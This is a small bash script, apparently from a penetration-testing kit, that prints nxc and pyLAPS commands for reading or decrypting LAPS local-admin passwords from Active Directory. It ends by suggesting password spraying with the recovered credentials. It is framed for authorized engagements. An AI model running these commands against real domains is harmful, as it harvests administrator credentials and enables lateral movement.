#!/usr/bin/env bash
# laps-read.sh -- read LAPS-managed local admin passwords (READ/DECRYPT, no GPU).
# LAPS stores each machine's local-admin password in AD. With the right ACL you
# just READ it (legacy, cleartext attribute) or DECRYPT it (Windows LAPS 2023+,
# DPAPI-NG). Never a crack. Authorized engagements only.
#
# Usage: ./laps-read.sh <domain> <user> <password> <dc-ip> [computer]
set -euo pipefail
DOMAIN="${1:?domain}"; USER="${2:?user}"; PASS="${3:?password}"; DC="${4:?dc-ip}"; COMP="${5:-}"

echo "[*] Legacy LAPS (ms-Mcs-AdmPwd) -- cleartext if you can read the attribute:"
echo "    nxc ldap $DC -u '$USER' -p '$PASS' -M laps ${COMP:+--computer $COMP}"
echo "    # or: pyLAPS.py --action get -d '$DOMAIN' -u '$USER' -p '$PASS'"
echo
echo "[*] Windows LAPS (encrypted, 2023+) -- decrypt with domain rights:"
echo "    nxc ldap $DC -u '$USER' -p '$PASS' -M laps    # nxc handles both variants"
echo
echo "[i] Recovered local-admin passwords -> spray/reuse checks + password-reuse"
echo "    finding in the report. No GPU time spent."
